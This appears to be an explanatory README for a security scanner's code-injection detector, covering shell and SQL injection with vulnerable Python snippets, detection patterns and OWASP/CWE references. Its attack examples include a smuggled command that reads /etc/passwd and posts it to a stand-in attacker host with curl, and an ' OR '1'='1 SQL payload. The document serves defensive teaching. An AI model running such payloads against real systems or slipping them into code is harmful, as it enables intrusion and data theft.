# Code Injection

## What Is This? (Plain English)

Imagine you order coffee by telling a barista "medium latte", and the barista types your exact words into a computer. Now imagine someone orders "medium latte; also email the entire customer database to hacker@evil.com." If the computer blindly executes whatever it receives, that second command runs too. Code injection works exactly the same way: when a program takes user-provided text and runs it as a command or database query without checking it first, attackers can sneak in their own instructions.

## What Does the Attack Look Like?

**Shell injection**: The tool accepts a hostname to ping:
```python
result = subprocess.run(f"ping -c 1 {host}", shell=True, ...)
```
Attacker provides `host = "8.8.8.8; cat /etc/passwd | curl -d @- http://attacker.com"`. The shell runs both commands: the legitimate ping and the data exfiltration.

**SQL injection**: The tool builds a query with string formatting:
```python
sql = f"SELECT * FROM users WHERE name = '{name}'"
```
Attacker provides `name = "' OR '1'='1"`. The resulting SQL becomes `WHERE name = '' OR '1'='1'` which returns every user row.

## The Technical Detail

Shell injection occurs when `subprocess.run(..., shell=True)` or `os.popen()` receives a string containing unvalidated user input. The shell interprets metacharacters (`;`, `&&`, `|`, `$()`, backticks) as command separators, enabling arbitrary command execution with the server process's privileges. SQL injection occurs when user input is concatenated into a query string rather than passed as a bound parameter. The database parser interprets the injected SQL as legitimate query syntax. Both vulnerabilities result from violating the principle of separating data from code.

## Vulnerable Code

See [`vulnerable.py`](vulnerable.py) and [`vulnerable.ts`](vulnerable.ts)

## Safe Code

See [`safe.py`](safe.py)

## How MCP Sentinel Detects This

The `CodeInjectionDetector` matches patterns including `shell=True` with variable interpolation, `os.popen(`, `eval(`, and f-string/concatenation SQL patterns (`f"SELECT`, `"SELECT * FROM" +`) and emits a `CODE_INJECTION` finding with `CRITICAL` severity.

## Official References

- **OWASP**: [OWASP Injection](https://owasp.org/Top10/A03_2021-Injection/) and [Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- **NIST / NVD**: [NVD CWE-78 Search](https://nvd.nist.gov/vuln/search/results?query=CWE-78)
- **CISA**: [CISA Known Exploited Vulnerabilities — Injection](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **CWE**: [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html) and [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
